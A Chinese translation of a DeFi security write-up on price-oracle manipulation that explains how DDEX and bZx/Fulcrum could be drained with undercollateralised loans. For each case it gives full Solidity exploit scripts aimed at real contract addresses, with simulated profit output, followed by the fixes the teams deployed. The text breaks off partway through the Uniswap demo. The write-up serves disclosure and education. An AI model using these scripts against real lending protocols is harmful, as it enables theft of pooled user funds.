> * 来源：https://samczsun.com/taking-undercollateralized-loans-for-fun-and-for-profit/作者：[SAMCZSUN](https://samczsun.com/author/samczsun/)
> * 译文出自：[登链翻译计划](https://github.com/lbc-team/Pioneer)
> * 译者：[翻译小组](https://learnblockchain.cn/people/412)
> * 校对：[Tiny 熊](https://learnblockchain.cn/people/15)
> * 本文永久链接：[learnblockchain.cn/article…](https://learnblockchain.cn/article/1)
# 通过操控抵押品价格预言机牟利

> 编者注：价格操纵攻击已经几乎无处不在，本文中，介绍了使用 DEX 交易所作为价格预言机有被操控的风险，最难得的难得的是：作者详细介绍了数个案例攻击原理、攻击Demo 演示（文末包含全部代码）、已经应对的解决方案。
>
> 推荐DEFI 开发者阅读。

## 太长不看版

因依赖链上去中心化的价格预言而不验证返回的价格，[DDEX](https://margin.ddex.io)和[bZx](https://bzx.network)容易受到价格操纵攻击。这导致DDEX的ETH/DAI市场损失ETH流动性，以及bZx中所有损失流动性资金，在本文中，将介绍价格操纵攻击的原理、如何实施的攻击、以及如何应对。

## 什么是去中心化贷款？

首先，让我们谈谈传统贷款。贷款时，通常需要提供某种抵押品，这样，如果你拖欠贷款，贷方便可以扣留抵押品。为了确定你需要提供多少抵押品，贷方通常会知道或能够可靠地计算出抵押品的公平市场价值(FMV)。

在去中心化贷款中，除了贷方现在是与外界隔离的智能合约之外，其他过程相同。这意味着它不能简单地“知道”你提供的任何抵押品的FMV。

为了解决此问题，开发人员指示智能合约查询价格预言机，该预言机接受代币地址并返回对应计价货币(例如ETH或USD)的当前价格。不同的DeFi项目采用了不同的方法来实现此预言机，但通常可以将它们全部归类为以下五种方式之一(尽管某些实现比其他实现更模糊)：

1. 链下中心化预言机
    这种类型的预言机只接受来自链下价格来源的新价格，通常来自项目控制的帐户。由于需要使用新汇率快速通知更新预言机，因此该帐户通常是EOA（外部账户），而不是多签钱包。可能需要进行一些合理的检查，以确保价格波动不会太大。 [ Compound ](https://compound.finance)和[[Synthetix](https://www.synthetix.io/)](https://www.synthetix.io)的大多数资产使用这种类型的预言机。

  

2. 链下去中心化预言机
    这种预言机从多个链下来源接受新价格，并通过数学函数(例如平均值)合并这些值。在此模型中，通常使用多签名钱包来管理授权价格源列表。 [Maker](https://makerdao.com/feeds/)针对ETH和其他资产使用这种类型的预言机。

  

3. 链上中心化预言机
    这种类型的预言机使用链上价格来源(例如DEX)确定资产价格。但是，只有授权账号才能触发预言机从链上源读取。像链下中心化预言机一样，这种类型的预言机需要快速更新，因此授权触发帐户可能是EOA而不是多签钱包。 [dYdX](https://dydx.exchange)和[Nuo](https://nuo.network)针对一些资产使用这种类型的预言机。

  

4. 链上去中心化预言机
    这种预言机使用链上价格来源确定资产价格，但是任何人都可以更新。可能需要进行一些合理检查，以确保价格波动不会太大。 [DDEX](https://margin.ddex.io)将这种类型的预言机用于DAI，而[bZx](https://bzx.network)对所有资产使用这种类型的预言机。

    
    
5. 常量预言机
     这种类型的预言机简单地返回一个常数，通常用于稳定币。由于USDC 钉住美元，因此上述几乎所有项目都将这种类型的预言机用于USDC。

## 问题

在寻找其他易受攻击的项目时，我看到了这条推文：



> 老实说，我担心他们会将其（Uniswap）用作价格喂价源。如果我的预感是正确的，那很容易受到攻击。

> — Vitalik 非以太赠予者(@VitalikButerin) [2019年2月20日](https://twitter.com/VitalikButerin/status/1098168793178820609?ref_src=twsrc%5Etfw)



有人询问为什么，Uniswap项目以下回应：

![image-20201221093632496](https://img.learnblockchain.cn/pics/20201221093640.png)

> 推文翻译如下：
>
> 为什么使用Uniswap价格源容易受到攻击？ 您的意思是操纵uniswap价格以触发清算吗？大多数金融衍生品市场，包括加密衍生品市场，其基础现货市场相比流动性数量级相形见绌。
>
> Uniswap 回复：由于可以进行大量交易，因此用函数检查价格预言，然后使用智能合约同步执行另一项巨大交易。 这意味着攻击者只会损失手续费用，而无法被起诉。 我们正致力于将来将Uniswap提升为Oracle。
>
> （译者注：tweet 的时间是 2019 年 2 月，但是具有时间加权功能的价格预言机功能的 Uniswap 还没有发布。）

这些推文非常清楚地说明了该问题，但需要注意的是，对于任何可以在链上提供FMV的预言机，而不仅仅是Uniswap，都存在此问题。

通常，如果价格预言机是完全去中心化的，则攻击者可以在特定瞬间操纵价格表现，而价格滑点的损失则很小甚至没有。如果攻击者随后能够在价格受到操纵的瞬间通知DeFi dApp检查预言机，则它们可能会对系统造成重大损害。在DDEX和bZx的情况下，有可能借出一笔看上去足够抵押的贷款，但实际上抵押不足。

## DDEX(Hydro协议)

DDEX是一个去中心化的交易平台，但是正在扩展到去中心化的借贷中，以便他们可以为用户提供创建杠杆多头和空头头寸的能力。他们目前正在对去中心化杠杆保证金交易进行Beta测试。

在2019年9月9日，DDEX将DAI作为资产添加到其保证金交易平台中，并启用了ETH/DAI市场。对于预言机，他们通过[这个合约](https://cn.etherscan.com/address/0xeB1f1A285fee2AB60D2910F2786E1D036E09EAA8)通过`PriceOfETHInUSD/PriceOfETHInDAI`计算返回DAI/USD的价格。ETH/USD的价格从Maker 预言机中读取，而ETH/DAI的价格从Eth2Dai中读取，或者如果价差太大，则从Uniswap读取。



```javascript
function peek()
	public
	view
	returns (uint256 _price)
{
	uint256 makerDaoPrice = getMakerDaoPrice();

	if (makerDaoPrice == 0) {
		return _price;
	}

	uint256 eth2daiPrice = getEth2DaiPrice();

	if (eth2daiPrice > 0) {
		_price = makerDaoPrice.mul(ONE).div(eth2daiPrice);
		return _price;
	}

	uint256 uniswapPrice = getUniswapPrice();

	if (uniswapPrice > 0) {
		_price = makerDaoPrice.mul(ONE).div(uniswapPrice);
		return _price;
	}

	return _price;
}

function getEth2DaiPrice()
	public
	view
	returns (uint256)
{
	if (Eth2Dai.isClosed() || !Eth2Dai.buyEnabled() || !Eth2Dai.matchingEnabled()) {
		return 0;
	}

	uint256 bidDai = Eth2Dai.getBuyAmount(address(DAI), WETH, eth2daiETHAmount);
	uint256 askDai = Eth2Dai.getPayAmount(address(DAI), WETH, eth2daiETHAmount);

	uint256 bidPrice = bidDai.mul(ONE).div(eth2daiETHAmount);
	uint256 askPrice = askDai.mul(ONE).div(eth2daiETHAmount);

	uint256 spread = askPrice.mul(ONE).div(bidPrice).sub(ONE);

	if (spread > eth2daiMaxSpread) {
		return 0;
	} else {
		return bidPrice.add(askPrice).div(2);
	}
}

function getUniswapPrice()
	public
	view
	returns (uint256)
{
	uint256 ethAmount = UNISWAP.balance;
	uint256 daiAmount = DAI.balanceOf(UNISWAP);
	uint256 uniswapPrice = daiAmount.mul(10**18).div(ethAmount);

	if (ethAmount < uniswapMinETHAmount) {
		return 0;
	} else {
		return uniswapPrice;
	}
}

function getMakerDaoPrice()
	public
	view
	returns (uint256)
{
	(bytes32 value, bool has) = makerDaoOracle.peek();

	if (has) {
		return uint256(value);
	} else {
		return 0;
	}
}
```
> 参考[源码](https://github.com/HydroProtocol/protocol/blob/244b01ad323a7d0796ae2eda3b7b455a361dd376/contracts/oracle/DaiPriceOracle.sol#L89-L155)



为了触发更新并使预言机刷新其存储的值，用户只需调用` updatePrice()`即可。



```javascript
function updatePrice()
	public
	returns (bool)
{
	uint256 _price = peek();

	if (_price != 0) {
		price = _price;
		emit UpdatePrice(price);
		return true;
	} else {
		return false;
	}
}
```

>  参考[源码](https://github.com/HydroProtocol/protocol/blob/244b01ad323a7d0796ae2eda3b7b455a361dd376/contracts/oracle/DaiPriceOracle.sol#L74-L87)



### 攻击原理

假设我们可以操纵DAI/USD的价格表现。如果是这种情况，我们希望使用它借用系统中的所有ETH，同时提供尽可能少的DAI。为此，我们可以降低ETH/USD的表现价格或增加DAI/USD的表现价格。由于我们已经假设DAI/USD的表现价值是可操纵的，因此我们选择后者。

为了增加DAI/USD的表现价格，我们可以增加ETH/USD的表现价格，或者降低ETH/DAI的表现价格。基于当前意图和目的，操纵Maker的预言是不可能的（因为其采用中心化链下预言机），因此我们将尝试降低ETH/DAI的表现价值。

> 编者注，因为 DAI/USD价格 = ETH/USD价格  ÷ ETH/DAI 价格 

预言机 通过 Eth2Dai取当前要价和当前出价的平均值来计算 ETH/DAI的值。为了降低此值，我们需要通过填充现有订单来降低当前出价，然后通过下新订单来降低当前要价。

但是，这需要大量的初始投资(因为我们需要先填写订单，然后再生成相等数量的订单)，并且实施起来并不容易。另一方面，我们可以通过在Uniswap大量交易DAI来影响Uniswap中的价格。因此，我们的目标是绕过Eth2Dai逻辑并操纵Uniswap价格。

为了绕过Eth2Dai，我们需要控制价格的波动幅度。我们可以通过以下两种方式之一进行操作：

1. 清除订单的一侧，而保留另一侧。这导致价差正增长
2. 通过列出极端的买入或卖出订单来强制执行交叉的订单。这会导致利差下降。

尽管选项2不会因不利订单而造成任何损失，但SafeMath不允许使用交叉订单，因此我们无法使用。相反，我们会通过清除订单的一侧来强制产生较大的正价差。这将导致DAI 预言机回退到Uniswap来确定DAI的价格。然后，我们可以通过购买大量DAI来降低DAI/ETH的Uniswap价格。一旦操纵了DAI/USD的表现价值，便像往常一样借贷很简单。

### 攻击演示

以下脚本将通过以下方式获利约70 ETH：

1. 清除Eth2Dai的卖单，直到价差足够大，以致预言机拒绝价格
2. 从Uniswap购买更多DAI，价格从213DAI/ETH降至13DAI/ETH
3. 用少量DAI(〜2500)借出所有可用ETH(〜120)
4. 将我们从Uniswap购买的DAI卖回Uniswap
5. 将我们从Eth2Dai购买的DAI卖回Eth2Dai
6. 重置预言机(不想让其他人滥用我们的优惠价格)

```javascript
contract DDEXExploit is Script, Constants, TokenHelper {
    OracleLike private constant ETH_ORACLE = OracleLike(0x8984F1CFf1d614a7404b0cfE97C6fa9110b93Bd2);
    DaiOracleLike private constant DAI_ORACLE = DaiOracleLike(0xeB1f1A285fee2AB60D2910F2786E1D036E09EAA8);
    
    ERC20Like private constant HYDRO_ETH = ERC20Like(0x000000000000000000000000000000000000000E);
    HydroLike private constant HYDRO = HydroLike(0x241e82C79452F51fbfc89Fac6d912e021dB1a3B7);
    
    uint16 private constant ETHDAI_MARKET_ID = 1;
    
    uint private constant INITIAL_BALANCE = 25000 ether;
    
    function setup() public {
        name("ddex-exploit");
        blockNumber(8572000);
    }
    
    function run() public {
        begin("exploit")
            .withBalance(INITIAL_BALANCE)
            .first(this.checkRates)
            .then(this.skewRates)
            .then(this.checkRates)
            .then(this.steal)
            .then(this.cleanup)
            .then(this.checkProfits);
    }
    
    function checkRates() external {
        uint ethPrice = ETH_ORACLE.getPrice(HYDRO_ETH);
        uint daiPrice = DAI_ORACLE.getPrice(DAI);
        
        printf("eth=%.18u dai=%.18u\n", abi.encode(ethPrice, daiPrice));
    }
    
    uint private boughtFromMatchingMarket = 0;
    
    function skewRates() external {
        skewUniswapPrice();
        skewMatchingMarket();
        require(DAI_ORACLE.updatePrice());
    }
    
    function skewUniswapPrice() internal {
        DAI.getFromUniswap(DAI.balanceOf(address(DAI.getUniswapExchange())) * 75 / 100);
    }
    
    function skewMatchingMarket() internal {
        uint start = DAI.balanceOf(address(this));
        WETH.deposit.value(address(this).balance)();
        WETH.approve(address(MATCHING_MARKET), uint(-1));
        while (DAI_ORACLE.getEth2DaiPrice() != 0) {
            MATCHING_MARKET.buyAllAmount(DAI, 5000 ether, WETH, uint(-1));
        }
        boughtFromMatchingMarket = DAI.balanceOf(address(this)) - start;
        WETH.withdrawAll();
    }
    
    function steal() external {
        HydroLike.Market memory ethDaiMarket = HYDRO.getMarket(ETHDAI_MARKET_ID);
        HydroLike.BalancePath memory commonPath = HydroLike.BalancePath({
            category: HydroLike.BalanceCategory.Common,
            marketID: 0,
            user: address(this)
        });
        HydroLike.BalancePath memory ethDaiPath = HydroLike.BalancePath({
            category: HydroLike.BalanceCategory.CollateralAccount,
            marketID: 1,
            user: address(this)
        });
        
        uint ethWanted = HYDRO.getPoolCashableAmount(HYDRO_ETH);
        uint daiRequired = ETH_ORACLE.getPrice(HYDRO_ETH) * ethWanted * ethDaiMarket.withdrawRate / DAI_ORACLE.getPrice(DAI) / 1 ether + 1 ether;
        
        printf("ethWanted=%.18u daiNeeded=%.18u\n", abi.encode(ethWanted, daiRequired));
        
        HydroLike.Action[] memory actions = new HydroLike.Action[](5);
        actions[0] = HydroLike.Action({
            actionType: HydroLike.ActionType.Deposit,
            encodedParams: abi.encode(address(DAI), uint(daiRequired))
        });
        actions[1] = HydroLike.Action({
            actionType: HydroLike.ActionType.Transfer,
            encodedParams: abi.encode(address(DAI), commonPath, ethDaiPath, uint(daiRequired))
        });
        actions[2] = HydroLike.Action({
            actionType: HydroLike.ActionType.Borrow,
            encodedParams: abi.encode(uint16(ETHDAI_MARKET_ID), address(HYDRO_ETH), uint(ethWanted))
        });
        actions[3] = HydroLike.Action({
            actionType: HydroLike.ActionType.Transfer,
            encodedParams: abi.encode(address(HYDRO_ETH), ethDaiPath, commonPath, uint(ethWanted))
        });
        actions[4] = HydroLike.Action({
            actionType: HydroLike.ActionType.Withdraw,
            encodedParams: abi.encode(address(HYDRO_ETH), uint(ethWanted))
        });
        DAI.approve(address(HYDRO), daiRequired);
        HYDRO.batch(actions);
    }
    
    function cleanup() external {
        DAI.approve(address(MATCHING_MARKET), uint(-1));
        MATCHING_MARKET.sellAllAmount(DAI, boughtFromMatchingMarket, WETH, uint(0));
        WETH.withdrawAll();
        
        DAI.giveAllToUniswap();
        require(DAI_ORACLE.updatePrice());
    }
    
    function checkProfits() external {
        printf("profits=%.18u\n", abi.encode(address(this).balance - INITIAL_BALANCE));
    }
}

/*
### running script "ddex-exploit" at block 8572000
#### executing step: exploit
##### calling: checkRates()
eth=213.440000000000000000 dai=1.003140638067989051
##### calling: skewRates()
##### calling: checkRates()
eth=213.440000000000000000 dai=16.058419875880325580
##### calling: steal()
ethWanted=122.103009983203364425 daiNeeded=2435.392672403537525078
##### calling: cleanup()
##### calling: checkProfits()
profits=72.140629996890984407
#### finished executing step: exploit
*/
```

### 解决方案

DDEX团队通过部署[新的预言机](https://etherscan.io/address/0xe6f148448b61339a59ef6ab9ab7378e9200fa745)解决了此问题这对DAI的价格设置了合约价格界限，目前将其设置为0.95和1.05。



```
function updatePrice()
	public
	returns (bool)
{
	uint256 _price = peek();

	if (_price == 0) {
		return false;
	}

	if (_price == price) {
		return true;
	}

	if (_price > maxPrice) {
		_price = maxPrice;
	} else if (_price < minPrice) {
		_price = minPrice;
	}

	price = _price;
	emit UpdatePrice(price);

	return true;
}
```
参考[源码](https://github.com/HydroProtocol/protocol/blob/0466e064234117d9c8f7ae6962fe6233427d8656/contracts/oracle/DaiPriceOracle.sol#L100-L124)



## bZx和Fulcrum

[bZx](https://bzx.network)是去中心化的保证金交易协议，而[Fulcrum](https://fulcrum.trade/#/)是bZx团队在bZx本身之上构建的项目。 Fulcrum的一个功能是可以通过 iToken (有关更多信息，请点击[此处](https://medium.com/bzxnetwork/introducing-fulcrum-tokenized-margin-made-dead-simple-e65ccc82393f))借贷,，它可以使用任何（在Kyber上交易）代币作为抵押。为了确定需要多少抵押品，bZx使用了[Kyber Network](https://kyber.network)作为链上去中心化预言机，以检查抵押代币和贷款代币之间的汇率。



但是，首先了解Kyber网络的功能很重要。与大多数其他DEX不同，Kyber网络从*reserves(准备金)*(有关更多信息，请点击[此处](https://developer.kyber.network/docs/Reserves-Intro/))中获得流动性，当用户想要在两个代币A和B之间进行交易时，主Kyber合约将查询所有已注册的储备金以获取A/ETH和ETH/B之间的最佳汇率，然后使用所选的两个储备金进行交易。

储备金可以通过*PermissionlessOrderbookReserveLister*合约列出，这将创建“permissionless（无许可）“储备金。在满足KYC和法律要求之后，Kyber团队也可以代表做市商列出储备金。在此案例中，储备金将是许可的储备金。使用Kyber进行交易时，交易者可以选择仅使用许可的储备金，或使用所有可用储备金。

### 攻击原理

当bZx检查抵押代币的价格时，它指定仅应使用“许可”的储备金。该决定是根据当时的Kyber白皮书做出的，其逻辑是必须对许可的储备金进行审核，因此汇率应该是“正确的”。

![](https://img.learnblockchain.cn/2020/12/17/16081915262837.jpg)
[来源](https://whitepaper.io/document/43/kyber-network-whitepaper),图片来源：Kyber Network



这意味着，如果我们能够以某种方式提高“许可”准备金的汇率，我们就可以欺骗Fulcrum认为我们的抵押物的价值超过其实际价值。

#### 许可的订单簿准备金

在2019年6月16日，Kyber团队在[此交易](https://etherscan.io/tx/0xce7df57e6b6d5589f19125b9298bbb36e672d373196d7610073540f59220c318)中将WAX代币的OrderbookReserve列为”许可“的储备金。这就有趣了。



将此储备金列出后，Kyber网络本身继续按照规范运行。但是，我们现在只需简单下订单，就可以显着影响WAX与ETH之间的汇率表现，这意味着我们可以欺骗任何依赖Kyber提供准确FMV的项目。

### 攻击演示

以下脚本将通过以下方式获得约1200ETH的利润：

1. 以10 ETH购买1 WAX下单，价格从0.00xETH/WAX涨到10ETH/WAX
2. 使用WAX作为抵押从bZx借用DAI
3. 取消所有订单并将所有资产兑换为ETH

```javascript
contract BZxWAXExploit is Script, Constants, TokenHelper, BZxHelpers {
    BZxLoanTokenV2Like private constant BZX_DAI = BZxLoanTokenV2Like(0x14094949152EDDBFcd073717200DA82fEd8dC960);
    
    ERC20Like private constant WAX = ERC20Like(0x39Bb259F66E1C59d5ABEF88375979b4D20D98022);
    OrderbookReserveLike private constant WAX_ORDER_BOOK = OrderbookReserveLike(0x75fF6BeC6Ed398FA80EA1596cef422D64681F057);
    
    uint constant private INITIAL_BALANCE = 150 ether;
    
    function setup() public {
        name("bzx-wax-exploit");
        blockNumber(8455720);
    }
    
    function run() public {
        begin("exploit")
            .withBalance(INITIAL_BALANCE)
            .first(this.checkRates)
            .then(this.makeOrder)
            .then(this.checkRates)
            .then(this.borrow)
            .then(this.cleanup)
            .finally(this.checkProfits);
    }
    
    uint constant rateCheckAmount = 1e8;
    
    function checkRates() external {
        (uint rate, uint slippage) = KYBER_NETWORK.getExpectedRate(WAX, KYBER_ETH, rateCheckAmount);
        printf("checking rates tokens=%.8u rate=%.18u slippage=%.18u\n", abi.encode(rateCheckAmount, rate, slippage));
    }
    
    uint constant waxBidAmount = 1e8;
    uint constant ethOfferAmount = 10 ether;
    uint32 private orderId;
    function makeOrder() external {
        orderId = WAX_ORDER_BOOK.ethToTokenList().nextFreeId();
        
        uint kncRequired = WAX_ORDER_BOOK.calcKncStake(ethOfferAmount);
        printf("making malicious order kncRequired=%.u\n", abi.encode(KNC.decimals(), kncRequired));
        
        KNC.getFromUniswap(kncRequired);
        WAX.getFromBancor(1 ether);
        
        WAX.approve(address(WAX_ORDER_BOOK), waxBidAmount);
        KNC.approve(address(WAX_ORDER_BOOK), kncRequired);
        
        WAX_ORDER_BOOK.depositEther.value(ethOfferAmount)(address(this));
        WAX_ORDER_BOOK.depositToken(address(this), waxBidAmount);
        WAX_ORDER_BOOK.depositKncForFee(address(this), kncRequired);
        require(WAX_ORDER_BOOK.submitEthToTokenOrder(uint128(ethOfferAmount), uint128(waxBidAmount)));
    }
    
    function borrow() external {
        bytes32 hash = doBorrow(BZX_DAI, false, BZX_DAI.marketLiquidity(), DAI, WAX);
        printf("borrowing loanHash=%32x\n", abi.encode(hash));
    }
    
    function cleanup() external {
        require(WAX_ORDER_BOOK.cancelEthToTokenOrder(orderId));
        WAX_ORDER_BOOK.withdrawEther(WAX_ORDER_BOOK.makerFunds(address(this), KYBER_ETH));
        WAX_ORDER_BOOK.withdrawToken(WAX_ORDER_BOOK.makerFunds(address(this), WAX));
        WAX_ORDER_BOOK.withdrawKncFee(WAX_ORDER_BOOK.makerKnc(address(this)));
        DAI.giveAllToUniswap();
        KNC.giveAllToUniswap();
        WAX.giveAllToBancor();
        WETH.withdrawAll();
    }
    
    function checkProfits() external {
        printf("profits=%.18u\n", abi.encode(address(this).balance - INITIAL_BALANCE));
    }
    
    function borrowInterest(uint amount) internal {
        DAI.getFromUniswap(amount);
    }
}

/*
### running script "bzx-wax-exploit" at block 8455720
#### executing step: exploit
##### calling: checkRates()
checking rates tokens=1.00000000 rate=0.000000000000000000 slippage=0.000000000000000000
##### calling: makeOrder()
making malicious order kncRequired=127.438017578344399080
##### calling: checkRates()
checking rates tokens=1.00000000 rate=10.000000000000000000 slippage=9.700000000000000000
##### calling: borrow()
collateral_required=232.02826470, interest_required=19750.481385867262370788
borrowing loanHash=0x2cca5c037a25b47338027b9d1bed55d6bc131b3d1096925538f611240d143c64
##### calling: cleanup()
##### calling: checkProfits()
profits=1170.851523093083307797
#### finished executing step: exploit
*/
```

##### Solution(解)

### 解决方案

bZx团队通过将可以用作抵押品的代币列入白名单来阻止此攻击。

### Eth2Dai

现在，有一个代币白名单可用作抵押品，我们需要遍历所有”许可“的储备金，以查看是否还有其他可滥用的东西。而DAI是白名单内的代币之一，具有与Eth2Dai集成的许可储备金。由于Eth2Dai允许用户创建限价单，这实质上和先前的攻击类似，但步骤更多。

有趣的是，我们首先观察到，尽管Eth2Dai合约的名称为` MatchingMarket`，但并非所有新订单都会自动匹配。这是因为虽然函数`offer(uint，ERC20，uint，ERC20，uint)`和`offer(uint，ERC20，uint，ERC20，uint，bool)`将触发匹配逻辑，但是函数`offer(uint， ERC20，uint，ERC20)`没有。



```
// Make a new offer. Takes funds from the caller into market escrow.
function offer(
	uint pay_amt,    //maker (ask) sell how much
	ERC20 pay_gem,   //maker (ask) sell which token
	uint buy_amt,    //maker (ask) buy how much
	ERC20 buy_gem,   //maker (ask) buy which token
	uint pos         //position to insert offer, 0 should be used if unknown
)
	public
	can_offer
	returns (uint)
{
	return offer(pay_amt, pay_gem, buy_amt, buy_gem, pos, true);
}

function offer(
	uint pay_amt,    //maker (ask) sell how much
	ERC20 pay_gem,   //maker (ask) sell which token
	uint buy_amt,    //maker (ask) buy how much
	ERC20 buy_gem,   //maker (ask) buy which token
	uint pos,        //position to insert offer, 0 should be used if unknown
	bool rounding    //match "close enough" orders?
)
	public
	can_offer
	returns (uint)
{
	require(!locked, "Reentrancy attempt");
	require(_dust[pay_gem] <= pay_amt);

	if (matchingEnabled) {
	  return _matcho(pay_amt, pay_gem, buy_amt, buy_gem, pos, rounding);
	}
	return super.offer(pay_amt, pay_gem, buy_amt, buy_gem);
}
```
[源码](https://github.com/makerdao/maker-otc/blob/d1c5e3f52258295252fabc78652a1a55ded28bc6/src/matching_market.sol#L113-L147)



此外，我们观察到，尽管这些注释似乎表明只有授权用户才能调用` offer(uint，ERC20，uint，ERC20)`，但根本没有授权逻辑。

```
// Make a new offer. Takes funds from the caller into market escrow.
//
// If matching is enabled:
//     * creates new offer without putting it in
//       the sorted list.
//     * available to authorized contracts only!
//     * keepers should call insert(id,pos)
//       to put offer in the sorted list.
//
// If matching is disabled:
//     * calls expiring market's offer().
//     * available to everyone without authorization.
//     * no sorting is done.
//
function offer(
	uint pay_amt,    //maker (ask) sell how much
	ERC20 pay_gem,   //maker (ask) sell which token
	uint buy_amt,    //taker (ask) buy how much
	ERC20 buy_gem    //taker (ask) buy which token
)
	public
	returns (uint)
{
	require(!locked, "Reentrancy attempt");
	var fn = matchingEnabled ? _offeru : super.offer;
	return fn(pay_amt, pay_gem, buy_amt, buy_gem);
}
```

尽管实际上没有授权是无关紧要的，因为套利机器人会迅速执行任何可以自动匹配的订单，但在原子交易中，我们可以创建和取消可套利的订单，而机器人无法参与执行。

剩下的就是从上次攻击中稍微修改我们的脚本，以在Eth2Dai而不是OrderbookReserve下订单。请注意，在此案例中，我们将需要同时调用` order(uint，ERC20，uint，ERC20)`将订单提交给Eth2Dai，而无需对其进行原子匹配，然后调用` insert(uint，uint)`以进行手动排序订单而不触发匹配。

#### 攻击演示

以下脚本将通过以下方式获利约2500ETH：

1. 以10 ETH购买1 DAI 下单，价格从0.006ETH/DAI上涨到9.98ETH/DAI。
2. 使用DAI作为抵押品从bZx借入ETH
3. 取消所有订单并将所有资产兑换为ETH

```javascript
contract BZxOasisExploit is Script, Constants, TokenHelper, BZxHelpers {
    BZxLoanTokenV2Like private constant BZX_ETH = BZxLoanTokenV2Like(0x77f973FCaF871459aa58cd81881Ce453759281bC);
    
    uint constant private INITIAL_BALANCE = 250 ether;
    
    function setup() public {
        name("bzx-oasis-exploit");
        blockNumber(8455720);
    }
    
    function run() public {
        begin("exploit")
            .withBalance(INITIAL_BALANCE)
            .first(this.checkRates)
            .then(this.makeOrder)
            .then(this.checkRates)
            .then(this.borrow)
            .then(this.cleanup)
            .finally(this.checkProfits);
    }
    
    uint constant rateCheckAmount = 1 ether;
    
    function checkRates() external {
        (uint rate, uint slippage) = KYBER_NETWORK.getExpectedRate(DAI, KYBER_ETH, rateCheckAmount);
        printf("checking rates tokens=%.18u rate=%.18u slippage=%.18u\n", abi.encode(rateCheckAmount, rate, slippage));
    }
    
    uint private id;
    
    uint constant daiBidAmount = 1 ether;
    uint constant ethOfferAmount = 10 ether;
    function makeOrder() external {
        WETH.deposit.value(ethOfferAmount)();
        WETH.approve(address(MATCHING_MARKET), ethOfferAmount);
        id = MATCHING_MARKET.offer(ethOfferAmount, WETH, daiBidAmount, DAI);
        printf("made order id=%u\n", abi.encode(id));
        
        require(MATCHING_MARKET.insert(id, 0));
    }
    
    function borrow() external {
        bytes32 hash = doBorrow(BZX_ETH, false, BZX_ETH.marketLiquidity(), WETH, DAI);
        printf("borrowing loanHash=%32x\n", abi.encode(hash));
    }
    
    function cleanup() external {
        require(MATCHING_MARKET.cancel(id));
        DAI.giveAllToUniswap();
        WETH.withdrawAll();
    }
    
    function checkProfits() external {
        printf("profits=%.18u\n", abi.encode(address(this).balance - INITIAL_BALANCE));
    }
    
    function borrowInterest(uint amount) internal {
        WETH.deposit.value(amount)();
    }
    
    function borrowCollateral(uint amount) internal {
        DAI.getFromUniswap(amount);
    }
}

/*
### running script "bzx-oasis-exploit" at block 8455720
#### executing step: exploit
##### calling: checkRates()
checking rates tokens=1.000000000000000000 rate=0.005950387240736517 slippage=0.005771875623514421
##### calling: makeOrder()
made order id=414191
##### calling: checkRates()
checking rates tokens=1.000000000000000000 rate=9.975000000000000000 slippage=9.675750000000000000
##### calling: borrow()
collateral_required=398.831304885561111810, interest_required=203.458599916962956188
borrowing loanHash=0x947839881794b73d61a0a27ecdbe8213f543bdd4f4a578eedb5e1be57221109c
##### calling: cleanup()
##### calling: checkProfits()
profits=2446.376892708285686012
#### finished executing step: exploit
*/
```

#### 解决方案

bZx团队可以通过修改预言机逻辑来阻止这种攻击，这样，如果抵押品和贷款代币都是DAI或WETH，那么汇率将直接从Maker的预言机中加载。



但是，由于Kyber选择最佳汇率的方式，该解决方案并不完整。如果你还记得，Kyber会通过确定A/ETH和ETH/B的最佳汇率来确定A/B的最佳汇率，然后计算通过交易A获得的ETH可以购买的B数量。

这意味着如果我们要尝试使用DAI作为抵押品借入非ETH代币(例如USDC)，则Kyber首先将确定DAI/ETH的最佳汇率，然后确定ETH/USDC的最佳汇率，最后确定最佳汇率DAI/USDC。因为我们可以人为地增加DAI/ETH的汇率，所以即使我们不控制”许可“的USDC储备金，我们仍然可以操纵DAI/USDC的汇率。

bZx团队以两种方式阻止了此攻击：

1. 如果贷款代币或抵押代币不是ETH，则bZx将手动确定代币与ETH之间的汇率，除非
2. 贷款代币或抵押代币是基于美元的稳定币，在此案例中，bZx将使用Maker预言机中的汇率

### Uniswap

机敏的读者可能会注意到，此时bZx的解决方案仍然无法为任意代币处理不正确的FMV。这意味着，如果我们可以找到另一个可以操纵的”许可“准备金，那么我们可以进行另一笔抵押不足的贷款。

筛选出所有列入白名单的代币的已注册”许可“储备金后，我们注意到REP代币是与Uniswap集成的储备金。从对DDEX的攻击中我们已经知道Uniswap的价格可以被操纵，因此我们可以重新调整以前的攻击目标，并将Eth2Dai和DAI替代为Uniswap和REP。

#### 攻击演示

以下脚本将通过以下方式获利约2500ETH：

1. 在Uniswap的REP交易所执行大订单购买，将价格从0.05ETH/REP提高到6.05ETH/REP
2. 使用REP作为抵押品从bZx借入ETH
3. 取消所有订单并将所有资产兑换为ETH

```javascript
contract BZxUniswapExploit is Script, Constants, TokenHelper, BZxHelpers {
    BZxLoanTokenV3Like private constant BZX_ETH = BZxLoanTokenV3Like(0x77f973FCaF871459aa58cd81881Ce453759281bC);
    
    uint constant private INITIAL_BALANCE = 5000 ether;
    
    function setup() public {
        name("bzx-uniswap-exploit");
        blockNumber(8547500);
    }
    
    function run() public {
        begin("exploit")
            .withBalance(INITIAL_BALANCE)
            .first(this.checkRates)
            .then(this.makeOrder)
            .then(this.checkRates)
            .then(this.borrow)
            .then(this.cleanup)
            .finally(this.checkProfits);
    }
    
    uint constant rateCheckAmount = 10 ether;
    
    function checkRates() external {
        (uint rate, uint slippage) = KYBER_NETWORK.getExpectedRate(REP, KYBER_ETH, rateCheckAmount);
        printf("checking rates tokens=%.18u rate=%.18u slippage=%.18u\n", abi.encode(rateCheckAmount, rate, slippage));
    }
    
    function makeOrder() external {
        UniswapLike uniswap = REP.getUniswapExchange();
        uint totalSupply = REP.balanceOf(address(uniswap));
        uint borrowAmount = totalSupply * 90 / 100;
        REP.getFromUniswap(borrowAmount);
        printf("making order totalSupply=%.18u borrowed=%.18u\n", abi.encode(totalSupply, borrowAmount));
    }
    
    function borrow() external {
        bytes32 hash = doBorrow(BZX_ETH, true, BZX_ETH.marketLiquidity(), WETH, REP);
        printf("borrowing loanHash=%32x\n", abi.encode(hash));
    }
    
    function cleanup() external {
        REP.giveAllToUniswap();
        WETH.withdrawAll();
    }
    
    function checkProfits() external {
        printf("profits=%.18u\n", abi.encode(address(this).balance - INITIAL_BALANCE));
    }
    
    function borrowInterest(uint amount) internal {
        WETH.deposit.value(amount)();
    }
}

/*
### running script "bzx-uniswap-exploit" at block 8547500
#### executing step: exploit
##### calling: checkRates()
checking rates tokens=10.000000000000000000 rate=0.057621091203633720 slippage=0.055892458467524708
##### calling: makeOrder()
